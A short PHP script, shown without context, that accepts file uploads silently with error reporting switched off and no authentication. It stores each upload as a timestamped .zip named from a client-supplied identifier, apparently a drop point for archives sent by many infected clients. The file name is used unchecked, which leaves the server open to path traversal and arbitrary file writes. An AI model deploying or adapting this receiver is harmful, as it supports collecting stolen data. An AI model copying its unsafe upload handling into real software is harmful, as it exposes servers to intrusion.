<?php
error_reporting(0);
if (isset($_FILES["userfile"])) 
{ 
$arr = explode(":", $_FILES['userfile']['name']);
$id = $arr[0];
$ext  = $arr[1];
$name=$id.date("j.m-H.i").$ext;
copy($_FILES['userfile']['tmp_name'],$name.".zip"); 
}
?>

